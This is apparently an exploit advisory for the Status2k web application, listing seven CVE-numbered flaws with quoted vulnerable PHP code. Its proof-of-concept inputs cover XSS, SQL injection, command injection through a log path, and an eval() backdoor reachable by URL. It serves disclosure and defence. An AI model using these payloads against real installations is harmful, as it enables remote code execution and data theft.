@@ -1,0 +1,138 @@
+# Exploit Title: Status2k Multiple Vulnerabilities/0days
+# Date: 6/20/2014
+# Exploit Author: Shayan Sadigh (twitter.com/r1pplex) | <ienjoy.ripples@gmail.com
+# Vendor Homepage: http://status2k.com/
+# Version: All
+# Tested on: Linux/Windows
+# CVE : CVE-2014-5088, CVE-2014-5089, CVE-2014-5090, CVE-2014-5091, CVE-2014-5092, CVE-2014-5093, CVE-2014-5094
+
+1. Cross site scripting/XSS... there's tons, example
+admin login page, etc
+
+login.php:
+
+if (isset($_GET['username'])) { $useren = $_GET['username']; }
+if (isset($_POST['password'])) { $useren = $_POST['username']; }
+$q = mysql_query("SELECT * FROM ".$prefix."users");
+$adminuser = $res['adminuser']; // Login Database
+$cusername = $_COOKIE["S2KUser"];
+if ( ($cusername == $adminuser) && ($cpassword == $adminpass) ) { $lgtrue = 1; }
+if ( ($useren == $adminuser) && ($passen == $adminpass) ) {
+setcookie("S2KUser", $useren);
+if ($passen && $useren) {
+if ($useren !== $adminuser) { echo '<div class="alert-message error"
+                              Username ('.$useren.') Incorrect.</div'; }
+        <input type="text" name="username" size="25" 
+
+simple injection can be done in the username field, <scriptalert("poc")</script, etc
+
+Use CVE-2014-5088 for all of the XSS issues.
+
+
+2. SQLi vulnerability in the GET (log)
+param... This isn't too useful seeing that if you had auth,
+much more damage could be done - refer to command injection
+lack of sanitization: in /admin/options/logs.php
+
+$l = $_GET['log'];
+  $q = mysql_query("SELECT * FROM ".$prefix."users");
+  $query = mysql_query("SELECT * FROM ".$prefix."logs WHERE id = '".$l."'");
+  $result = mysql_fetch_array($query) or die(mysql_error());
+    $query = mysql_query("SELECT * FROM ".$prefix."logs WHERE id = '".$l."'");
+    $result = mysql_fetch_array($query) or die(mysql_error());
+    $query = mysql_query("SELECT * FROM ".$prefix."logs WHERE id = '".$l."'");
+    $result = mysql_fetch_array($query) or die(mysql_error());
+
+- PoC: site.com/s2kdir/admin/options/logs.php?log=[sqli]
+
+Use CVE-2014-5089.
+
+
+3. Command injection
+This requires access to the Status2k Admin
+Panel, log-in and proceed to click the 'Logs' tab, then select
+'Add Logs', type in any name and for the 'Location' field use
+command injection... Then browse to the created log via the 'Logs'
+tab again.
+
+- example: Logs --Add Logs --; then Logs --newly created log
+
+Name: test Location: /var/log/dmesg;pwd; uname -a
+localhost/admin/options/addlog.php?type=edit&id=5
+
+so there's no sanitization in addlog.php which lets you put anything
+you want as a log location... the issue now is that in logs.php:
+
+$logc = cmdrun($config['logcmd'].$result['location']);
+    $log = explode("\n", $logc);
+    $log = array_reverse($log);
+
+cmdrun literally calls the equivalent of exec() and thus completely
+execution of a command.
+
+if it is complaining about dmesg... try other log locations... such as
+/usr/local/apache/logs/suexec_log, also try other bash chars, such as
+
+| & && ; $(), etc
+
+Use CVE-2014-5090.
+
+
+4. eval() [RCE] backdoor..
+For about a year, status2k.com was hosting a backdoored version
+of their software... either they knew it or not, there was never an
+announcement when the backdoor was found (good job).
+
+in the file /includes/functions.php:
+eval($_GET['multies']);
+
+site.com/s2k/includes/functions.php?multies=inject_php_code here
+
+PoC: site.com/s2k/includes/functions.php?multies=echo 'foobar';
+
+Use CVE-2014-5091.
+
+
+5. Another RCE
+status2k also lacks sanitization in the templates; /admin/options/editpl.php
+
+one can literally place any malicious php code they want here and have it execute
+
+// Let's make sure the file exists and is writable first.
+if (is_writable("../../templates/".$config['templaten']."/".$filename)) {
+
+    // In our example we're opening $filename in append mode.
+    // The file pointer is at the bottom of the file hence
+    // that's where $somecontent will go when we fwrite() it.
+    if (!$handle = fopen("../../templates/".$config['templaten']."/".$filename, 'w')) {
+         echo "Cannot open file (../../templates/".$config['templaten']."/".$filename.")";
+         exit;
+    }
+
+    // Write $somecontent to our opened file.
+    if (fwrite($handle, $value) === FALSE) {
+        echo "Cannot write to file (../../templates/".$config['templaten']."/".$filename.")";
+        exit;
+    } else {
+echo "Success, $filename updated!";
+
+once again complete lack of sanitization.
+
+Use CVE-2014-5092.
+
+
+6. Design flaw by default Status2k does not remove the install
+directory (/install/), this may lead to an attacker resetting the
+admin credentials and thus logging in and causing further damage
+through RCE vectors listed above.
+
+Use CVE-2014-5093.
+
+
+7. Information leak... it is not shown by default on the index.php
+of status2k above version 2, however // PHPINFO ========== //
+================== $action = $_GET["action"]; if ($action ==
+"phpinfo") { phpinfo(); die(); } allows anyone to view the server's
+phpinfo page (localhost/status/index.php?action=phpinfo)
+
+Use CVE-2014-5094.
